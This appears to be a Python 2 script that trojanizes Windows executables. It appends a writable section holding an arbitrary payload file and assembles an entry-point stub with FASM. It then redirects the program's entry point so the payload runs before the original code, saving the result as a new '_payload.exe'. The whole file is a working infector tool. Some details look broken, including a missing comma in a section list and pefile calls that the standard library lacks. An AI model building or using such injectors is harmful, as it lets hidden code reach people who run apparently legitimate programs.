#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Requirements:
    Python 2.7.13
    Tornado
    pefile
"""
import os
import pefile
from tornado.template import Template
import sys

"""
Function for pars purpose of sections
"""
def ParsingSelection(pe):
    CODE_SECTION = ["text","code"]
    DATA_SECTION = ["data", "rsrc"]
    NO_PACKED_SECTION = ["idata", "rdata", "tls" "iat", "import", "it"]
    result = {}
    result["CS"] = []
    result["DS"] = []
    i = -1
    print("[*] Start section analysis")
    for section in pe.sections:
        next = False
        i += 1
        for s_name in NO_PACKED_SECTION:
            if section.Name.lower().find(s_name) != -1:
                print("    - ignore '"+section.Name+"'")
                next = True
                break
        if next:
            continue
        for s_name in CODE_SECTION:
            if section.Name.lower().find(s_name)!=-1:
                result["CS"].append(i)
                print("    - detect CODE '"+section.Name+"'")
                next = True
        if next:
            continue
        for s_name in DATA_SECTION:
            if section.Name.lower().find(s_name)!=-1:
                result["DS"].append(i)
                print("    - detect DATA '"+section.Name+"'")
    return result

def main():
    try:
        pe = pefile.PE(sys.argv[1])
    except:
        print("Cannon open file.")
        sys.exit(-1)
    SectionMap = ParsingSelection(pe)
    payload = open("payload.data").read()
    new_section = payload
    pe.add_last_section(size=len(payload), selection_name=".xdata")
    pe.sections[-1].Characteristics |= pefile.SECTION_CHARACTERISTICS["IMAGE_SCN_MEM_WRITE"]

    ###Get import list
    imports = {}
    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        for imp in entry.imports:
            imports[imp.name] = imp.address

    asm = Template(open("GO_OEP.tpl.asm", "r").read()).generate(
        imports = imports,
        go=pe.OPTIONAL_HEADER.ImageBase+pe.OPTIONAL_HEADER.AddressOfEntryPoint,
        offset_payload = pe.OPTIONAL_HEADER.ImageBase+pe.sections[-1].VirtualAddress
    )
    with open("GO_OEP.asm", "w") as f:
        f.write(asm)
    print("[*] Compiling assembler dynamic code GO_OEP.asm")
    os.system(os.getcwd() + r"\fasm\FASM.EXE GO_OEP.asm")
    new_section += open("GO_OEP.bin", "rb").read()
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.sections[-1].VirtualAddress + len(payload)
    pe.data_replace(offset=pe.sections[-1].PointerToRawData,
                    new_data=new_section)
    pe.write(filename=sys.argv[1][:-4]+"_payload.exe")


if __name__ == "__main__":
    main()